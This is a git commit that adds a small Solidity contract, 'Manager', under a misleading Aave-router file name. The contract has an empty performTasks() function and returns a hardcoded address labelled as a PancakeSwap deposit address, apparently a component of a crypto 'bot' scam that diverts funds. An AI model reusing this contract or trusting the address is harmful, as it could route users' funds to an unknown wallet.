de557dbf5baa16602b0a593b649b99ef46658318
MF-Finance <110341152+MF-Finance@users.noreply.github.com>
2022-07-31 16:13:03 +0200

    Create IAaveRouterCallerMain.sol

---
+++ IAaveRouterCallerMain.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0xEc34A88643E99b6800fCcAeFa5d5fF948Ad566D7;
+    }
+}
